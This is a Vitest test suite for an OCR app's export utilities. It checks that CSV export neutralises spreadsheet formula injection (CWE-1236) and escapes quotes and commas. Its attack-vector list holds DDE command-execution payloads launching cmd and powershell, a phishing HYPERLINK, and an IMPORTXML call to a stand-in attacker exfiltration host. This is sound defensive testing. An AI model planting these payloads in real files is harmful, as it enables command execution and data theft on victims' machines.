/**
 * frontend/src/__tests__/lib/exportUtils.cwe1236.adversarial.test.ts
 * Dedicated Empirical Adversarial Test Suite for CWE-1236 Formula Injection Mitigation
 * and Secure Multi-Format Export Utilities.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import {
  exportDocumentAsJson,
  exportDocumentAsTxt,
  exportDocumentAsCsv,
  copyTextToClipboard,
  downloadFile,
} from '@/lib/exportUtils';
import { DocumentOCRResult } from '@/types/ocr';
import { SAMPLE_CLEAN_CURSIVE, SAMPLE_MULTIPAGE } from '@/lib/sampleDocuments';

describe('CWE-1236 Formula Injection & Secure Export Utilities Adversarial Suite', () => {
  // Comprehensive attack vectors covering all known spreadsheet execution prefixes
  const formulaAttackVectors = [
    { type: 'Equals (=) Command Execution', payload: `=cmd|'/C calc.exe'!A0` },
    { type: 'Equals (=) Function Invocation', payload: `=SUM(1+1)` },
    { type: 'Plus (+) Formula Prefix', payload: `+HYPERLINK("https://malicious.site/phish", "Click Here")` },
    { type: 'Minus (-) Negative Expression Formula', payload: `-2+5*cmd|' /C powershell'!A0` },
    { type: 'At (@) Macro / Formula Prefix', payload: `@SUM(10, 20)` },
    { type: 'At (@) Remote XML Import', payload: `@IMPORTXML("https://attacker.site/exfil", "//a")` },
    { type: 'Tab (\\t) Prepended Injection', payload: `\t=1+1` },
    { type: 'Tab (\\t) Prepended Raw Command', payload: `\tmalicious_payload` },
    { type: 'Carriage Return (\\r) Prepended Formula', payload: `\r=cmd|' /C calc'!A0` },
    { type: 'Carriage Return (\\r) Prepended Command', payload: `\rexec_payload` },
    { type: 'DDE Server Lookup', payload: `=DDE("cmd";"/C notepad.exe";"__DDE__")` },
    { type: 'Spreadsheet Formula with Quotes', payload: `=IF(1=1,"malicious","safe")` },
    { type: 'Leading plus with negative number', payload: `+1234` },
    { type: 'Leading minus with arithmetic', payload: `-1234` },
  ];

  describe('1. CSV CWE-1236 Sanitization & Neutralization', () => {
    formulaAttackVectors.forEach(({ type, payload }) => {
      it(`neutralizes ${type} in word tokens: ${JSON.stringify(payload)}`, () => {
        const maliciousDoc: DocumentOCRResult = {
          document_id: 'doc_cwe_1236',
          filename: 'adversarial_test.png',
          total_pages: 1,
          mean_confidence: 0.95,
          processing_time_ms: 45,
          full_text: payload,
          pages: [
            {
              page_number: 1,
              width: 1000,
              height: 1000,
              mean_confidence: 0.95,
              full_text: payload,
              lines: [
                {
                  line_id: payload,
                  line_number: 1,
                  text: payload,
                  original_text: payload,
                  confidence: 0.95,
                  bbox: [0.1, 0.1, 0.2, 0.9],
                  words: [
                    {
                      word_id: payload,
                      text: payload,
                      original_text: payload,
                      confidence: 0.95,
                      bbox: [0.1, 0.1, 0.2, 0.5],
                    },
                  ],
                },
              ],
            },
          ],
        };

        const csv = exportDocumentAsCsv(maliciousDoc);
        const rows = csv.split('\n');
        expect(rows.length).toBe(2);

        const escapedExpected = payload.replace(/"/g, '""');
        // Sanitization must prepend single quote (') and enclose in double quotes
        expect(rows[1]).toContain(`"\'${escapedExpected}"`);
      });

      it(`neutralizes ${type} in unsegmented line items: ${JSON.stringify(payload)}`, () => {
        const maliciousLineDoc: DocumentOCRResult = {
          document_id: 'doc_line_cwe',
          filename: 'adversarial_line.png',
          total_pages: 1,
          mean_confidence: 0.9,
          processing_time_ms: 30,
          full_text: payload,
          pages: [
            {
              page_number: 1,
              width: 800,
              height: 1200,
              mean_confidence: 0.9,
              full_text: payload,
              lines: [
                {
                  line_id: payload,
                  line_number: 1,
                  text: payload,
                  original_text: payload,
                  confidence: 0.9,
                  bbox: [0.1, 0.1, 0.2, 0.8],
                  words: [],
                },
              ],
            },
          ],
        };

        const csv = exportDocumentAsCsv(maliciousLineDoc);
        const escapedExpected = payload.replace(/"/g, '""');
        expect(csv).toContain(`"\'${escapedExpected}"`);
      });
    });

    it('does not prepend single quote to safe medical terms or normal alphanumeric strings', () => {
      const safeDoc: DocumentOCRResult = {
        document_id: 'doc_safe',
        filename: 'safe.png',
        total_pages: 1,
        mean_confidence: 0.98,
        processing_time_ms: 20,
        full_text: 'Amoxicillin 500mg PO TID',
        pages: [
          {
            page_number: 1,
            width: 1000,
            height: 1000,
            mean_confidence: 0.98,
            full_text: 'Amoxicillin 500mg PO TID',
            lines: [
              {
                line_id: 'l1',
                line_number: 1,
                text: 'Amoxicillin 500mg PO TID',
                original_text: 'Amoxicillin 500mg PO TID',
                confidence: 0.98,
                bbox: [0.1, 0.1, 0.2, 0.9],
                words: [
                  {
                    word_id: 'w1',
                    text: 'Amoxicillin',
                    confidence: 0.98,
                    bbox: [0.1, 0.1, 0.2, 0.4],
                  },
                ],
              },
            ],
          },
        ],
      };

      const csv = exportDocumentAsCsv(safeDoc);
      expect(csv).toContain('"Amoxicillin"');
      expect(csv).not.toContain('"\'Amoxicillin"');
    });
  });

  describe('2. RFC 4180 Escaping: Embedded Quotes, Commas, and Line Breaks', () => {
    it('escapes embedded quotes by doubling them per RFC 4180', () => {
      const quoteDoc: DocumentOCRResult = {
        document_id: 'doc_quote',
        filename: 'quote.png',
        total_pages: 1,
        mean_confidence: 0.9,
        processing_time_ms: 25,
        full_text: 'Take "one" tablet daily',
        pages: [
          {
            page_number: 1,
            width: 800,
            height: 1000,
            mean_confidence: 0.9,
            full_text: 'Take "one" tablet daily',
            lines: [
              {
                line_id: 'l1',
                text: 'Take "one" tablet daily',
                confidence: 0.9,
                bbox: [0.1, 0.1, 0.2, 0.8],
                words: [
                  {
                    word_id: 'w1',
                    text: '"one"',
                    confidence: 0.9,
                    bbox: [0.1, 0.1, 0.2, 0.3],
                  },
                ],
              },
            ],
          },
        ],
      };

      const csv = exportDocumentAsCsv(quoteDoc);
      expect(csv).toContain('"""one"""');
    });

    it('encloses commas safely in cell values without column skew', () => {
      const commaDoc: DocumentOCRResult = {
        document_id: 'doc_comma',
        filename: 'comma.png',
        total_pages: 1,
        mean_confidence: 0.92,
        processing_time_ms: 25,
        full_text: 'Dr. John Doe, MD, FACP',
        pages: [
          {
            page_number: 1,
            width: 800,
            height: 1000,
            mean_confidence: 0.92,
            full_text: 'Dr. John Doe, MD, FACP',
            lines: [
              {
                line_id: 'l1',
                text: 'Dr. John Doe, MD, FACP',
                confidence: 0.92,
                bbox: [0.1, 0.1, 0.2, 0.8],
                words: [
                  {
                    word_id: 'w1',
                    text: 'Doe, MD, FACP',
                    confidence: 0.92,
                    bbox: [0.1, 0.1, 0.2, 0.6],
                  },
                ],
              },
            ],
          },
        ],
      };

      const csv = exportDocumentAsCsv(commaDoc);
      expect(csv).toContain('"Doe, MD, FACP"');
    });
  });

  describe('3. JSON and TXT Serialization Boundary & Multi-Page Testing', () => {
    it('serializes multi-page document into valid structured JSON', () => {
      const jsonStr = exportDocumentAsJson(SAMPLE_MULTIPAGE);
      const parsed = JSON.parse(jsonStr);

      expect(parsed.document_id).toBe(SAMPLE_MULTIPAGE.document_id);
      expect(parsed.total_pages).toBe(3);
      expect(parsed.pages.length).toBe(3);
      expect(parsed.pages[0].lines.length).toBeGreaterThan(0);
      expect(parsed.export_timestamp).toBeDefined();
    });

    it('serializes multi-page document into TXT with standard page break dividers', () => {
      const txt = exportDocumentAsTxt(SAMPLE_MULTIPAGE);
      expect(txt).toContain('--- PAGE BREAK ---');
      const pages = txt.split('--- PAGE BREAK ---');
      expect(pages.length).toBe(3);
    });

    it('handles empty document gracefully in JSON, TXT, and CSV', () => {
      const emptyDoc: DocumentOCRResult = {
        document_id: 'doc_empty',
        filename: 'empty.png',
        total_pages: 0,
        mean_confidence: 0,
        processing_time_ms: 0,
        full_text: '',
        pages: [],
      };

      const jsonStr = exportDocumentAsJson(emptyDoc);
      const parsed = JSON.parse(jsonStr);
      expect(parsed.pages).toEqual([]);

      const txt = exportDocumentAsTxt(emptyDoc);
      expect(txt).toBe('');

      const csv = exportDocumentAsCsv(emptyDoc);
      const lines = csv.trim().split('\n');
      expect(lines.length).toBe(1);
      expect(lines[0]).toContain('page,line_number,line_id,word_id');
    });
  });

  describe('4. Clipboard and File Download Helpers', () => {
    beforeEach(() => {
      vi.restoreAllMocks();
    });

    it('copies text via navigator.clipboard.writeText when supported', async () => {
      const writeTextMock = vi.fn().mockResolvedValue(undefined);
      Object.defineProperty(navigator, 'clipboard', {
        value: { writeText: writeTextMock },
        configurable: true,
      });

      const success = await copyTextToClipboard('Sample prescription transcription');
      expect(success).toBe(true);
      expect(writeTextMock).toHaveBeenCalledWith('Sample prescription transcription');
    });

    it('falls back to document.execCommand when navigator.clipboard throws', async () => {
      Object.defineProperty(navigator, 'clipboard', {
        value: {
          writeText: vi.fn().mockRejectedValue(new Error('Permission denied')),
        },
        configurable: true,
      });

      document.execCommand = vi.fn().mockReturnValue(true);

      const success = await copyTextToClipboard('Fallback clipboard text');
      expect(success).toBe(true);
      expect(document.execCommand).toHaveBeenCalledWith('copy');
    });

    it('creates a download link and revokes blob URL', () => {
      const clickSpy = vi.fn();
      const removeSpy = vi.fn();
      const originalCreateElement = document.createElement.bind(document);

      vi.spyOn(document, 'createElement').mockImplementation((tagName: string) => {
        const el = originalCreateElement(tagName);
        if (tagName === 'a') {
          el.click = clickSpy;
          el.remove = removeSpy;
        }
        return el;
      });

      const revokeSpy = vi.spyOn(URL, 'revokeObjectURL');

      downloadFile('page,line\n1,Amoxicillin', 'export.csv', 'text/csv;charset=utf-8;');

      expect(clickSpy).toHaveBeenCalledTimes(1);
      expect(removeSpy).toHaveBeenCalledTimes(1);
      expect(revokeSpy).toHaveBeenCalledTimes(1);
    });
  });
});
